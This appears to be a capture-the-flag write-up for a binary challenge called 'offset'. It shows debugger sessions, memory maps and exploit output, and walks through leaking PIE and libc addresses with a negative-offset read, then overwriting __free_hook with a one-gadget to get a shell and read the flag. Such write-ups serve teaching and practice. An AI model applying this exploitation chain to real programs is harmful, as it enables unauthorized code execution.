# Solution

Binary allows users to specify an offset from a starting address in order to write content in an unordered fashion:
```sh
$ ./offset 
give us your name: h
hello h
!
input number of bytes to allocate (max 32): 20
your location is at 0x7ffe06878e60
choose offset: 10 
offsetting for 10 ...
your location is at 0x7ffe06878e6a
choose op: (r)ead current, (w)rite current or (p)rint result? w
AAAAAAAAAAAA
your location is at 0x7ffe06878e60
choose offset: offsetting for 0 ...
your location is at 0x7ffe06878e60
choose op: (r)ead current, (w)rite current or (p)rint result? unknown op
your location is at 0x7ffe06878e60
choose offset: offsetting for 0 ...
your location is at 0x7ffe06878e60
choose op: (r)ead current, (w)rite current or (p)rint result? unknown op
your location is at 0x7ffe06878e60
choose offset: 30
out of bounds offset! defaulting to 0 ...
your location is at 0x7ffe06878e60
choose op: (r)ead current, (w)rite current or (p)rint result? r
2000000000000000d27241414141414141414100
your location is at 0x7ffe06878e60
choose offset: 20
offsetting for 20 ...
your location is at 0x7ffe06878e74
choose op: (r)ead current, (w)rite current or (p)rint result? r
1400000000e677598aefc117b08e8706fe7f0000
your location is at 0x7ffe06878e60
choose offset: 
```

As observed, overwriting `rip` or specifying a large offset to position at `rip` value is not possible.

The only thing possible is specifying a negative value which gives one the ability to jump to lower addresses:
```sh
$ ./offset 
give us your name: h
hello h
!
input number of bytes to allocate (max 32): 32
your location is at 0x7ffeacf7d9f0
choose offset: -20
offsetting for -20 ...
your location is at 0x7ffeacf7d9dc
choose op: (r)ead current, (w)rite current or (p)rint result? r
5f55000040daf7acfe7f00006115389c5f5500002000000000000000d212389c
your location is at 0x7ffeacf7d9f0
choose offset: 
```

Since stack is at the bottom, all other regions are available for reading and editing:
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555555000 r--p     1000 0      /tmp/offset
    0x555555555000     0x555555556000 r-xp     1000 1000   /tmp/offset
    0x555555556000     0x555555557000 r--p     1000 2000   /tmp/offset
    0x555555557000     0x555555558000 r--p     1000 2000   /tmp/offset
    0x555555558000     0x555555559000 rw-p     1000 3000   /tmp/offset
    0x555555559000     0x55555557a000 rw-p    21000 0      [heap]
    0x7ffff7dc3000     0x7ffff7de8000 r--p    25000 0      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7de8000     0x7ffff7f60000 r-xp   178000 25000  /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7f60000     0x7ffff7faa000 r--p    4a000 19d000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7faa000     0x7ffff7fab000 ---p     1000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fab000     0x7ffff7fae000 r--p     3000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fae000     0x7ffff7fb1000 rw-p     3000 1ea000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fb1000     0x7ffff7fb7000 rw-p     6000 0      [anon_7ffff7fb1]
    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000 0      [vvar]
    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000 0      [vdso]
    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000 0      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000 1000   /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000 24000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 2c000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2d000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
```

Binary also has all security controls enabled:
```sh
$ checksec /tmp/offset
[*] '/tmp/offset'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Leaking binary information

Since all security controls are enabled we cannot:
- control `rip` because binary blocks overwrite
  - there is also stack canary, but it can be leaked
- overwrite `.got` because full RELRO is activated
- implant own shellcode and execute because NX is enabled and no RWX segments present
- jump and change predefined addresses because of PIE

This makes things a lot harder, but observe that `(r)ead`ing operation will always read 32 bytes of data. This means that we can leak stored `rip` value. Alternatively, if we read the stack immediately on first operation, we can leak the address of `prompt_alloc_size+73` instruction:
```
pwndbg> x/2gx $rsp
0x7fffffffdec0:	0x0000000000000020	0x00005555555552d2
pwndbg> x/i $rip
=> 0x5555555555b9 <loop+475>:	call   0x555555555140 <printf@plt>
pwndbg> x/2gx $rsp
0x7fffffffdec0:	0x0000000000000020	0x00005555555552d2
pwndbg> x/i 0x00005555555552d2
   0x5555555552d2 <prompt_alloc_size+73>:	mov    eax,DWORD PTR [rbp-0xc]
```

This enables us to calculate the base address of the binary and map out all of the locations (`.got`, `.plt`, `libc`, ...) since offsets are always fixed. In particular, if `prompt_alloc_size+73` is at `0x5555555552d2` and `prompt_alloc_size` offset is `0x1289`, binary base address is `0x555555554000`.

## Rerouting execution

Since full RELRO is enabled, we cannot overwrite `.got` and wait for a specific function call, but binary performs two calls before calling the `loop` function:
```c
undefined8 main(void)

{
  alarm(0x3c);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  u = (char *)malloc(0x20);
  printf("give us your name: ");
  fgets(u,0x20,stdin);
  printf("hello %s!\n",u);
  loop();
  free(u);
  return 0;
}
```

Before initiating the loop, username is `malloc`'d and a prompt pops up asking for a name. When exiting the `loop` function, allocated username is `free`d. This is an opportunity to use standard libc hooks to reroute execution, overwriting the libc `__free_hook` in particular.

Steps to reroute execution would be:
- leak `prompt_alloc_size+73` address
- calculate bin base address
- leak `.got` function value (any of our choice)
- calculate libc base address
- overwrite `__free_hook` value with a one gadget
- exit the loop to trigger our `__free_hook` and pop a shell

Full exploit is in `solve.py`:
```sh
$ python3 solve.py 
[+] Opening connection to localhost on port 9000: Done
leaked prompt_alloc_size instr address 0x5562c64c12d2
got base address 0x5562c64c0000
pointing to puts@got.plt at 0x5562c64c3f90
puts@got.plt value is 0x7f3ff46125a0
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
free hook is at 0x7f3ff4779b28
overwritten free_hook at 0x7f3ff4779b28 with 0x7f3ff4671c81
[*] Switching to interactive mode
 $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag.txt
offset
start.sh
$ cat flag.txt
ibctf{n0t-wr4pping-t0rt1ll4z_h3r3_w3-wr4pp1ng-m3m0r13z}
$ 
```
